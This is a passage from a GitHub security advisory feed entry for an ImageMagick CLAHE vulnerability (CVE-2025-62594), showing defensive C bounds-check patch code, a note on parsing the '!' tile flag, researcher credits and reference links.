                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}

ssize_t tile_h_minus1 = (ssize_t)tile_info.height - 1;
if (tile_h_minus1 &lt; 0) {
  ThrowMagickException(exception, GetMagickModule(), OptionError,
                       "CLAHEInvalidTile", "%lux%lu",
                       (unsigned long) tile_info.width,
                       (unsigned long) tile_info.height);
  return (Image *) NULL;
}
p += (ptrdiff_t) clahe_info-&gt;width * tile_h_minus1;
</code></pre>
<p>Notes about <code>exact_tiles_requested</code>: if the CLI/Wand parser already exposes whether <code>!</code> was present, use it. If not, add a parse-time flag so CLAHEImage can know whether <code>0</code> is literal or auto.</p>
<hr>
<h2 id="credit">Credit</h2>
<h3 id="team-whys">Team Whys</h3>
<p><strong>Bug Hunting Master Program, HSpace/Findthegap</strong></p>
<p><strong>Youngmin Kim</strong> 
<a href="mailto:kunshim@naver.com">kunshim@naver.com</a></p>
<p><strong>Woojin Park</strong></p>
<p><a href="https://github.com/jin-156">@jin-156</a>
<a href="mailto:1203kids@gmail.com">1203kids@gmail.com</a></p>
<p><strong>Youngin Won</strong></p>
<p><a href="https://github.com/amethyst0225">@amethyst0225</a>
<a href="mailto:youngin04@korea.ac.kr">youngin04@korea.ac.kr</a></p>
<p><strong>Siyeon Han</strong></p>
<p><a href="https://github.com/hanbunny">@hanbunny</a>
<a href="mailto:kokosyeon@gmail.com">kokosyeon@gmail.com</a></p>
<p><strong>Shinyoung Won</strong></p>
<p><a href="yosimich123@gmail.com">@yosiimich</a>
<a href="mailto:yosimich123@gmail.com">yosimich123@gmail.com</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62594">https://nvd.nist.gov/vuln/detail/CVE-2025-62594</a></li>
<li><a href="https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129">https://github.com/ImageMagick/ImageMagick/commit/7b47fe369eda90483402fcd3d78fa4167d3bb129</a></li>
<li><a href="https://github.com/advisories/GHSA-wpp4-vqfq-v4hp">https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wpp4-vqfq-v4hp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-10-27T23:33:10.000Z</published>
    </entry>
</feed>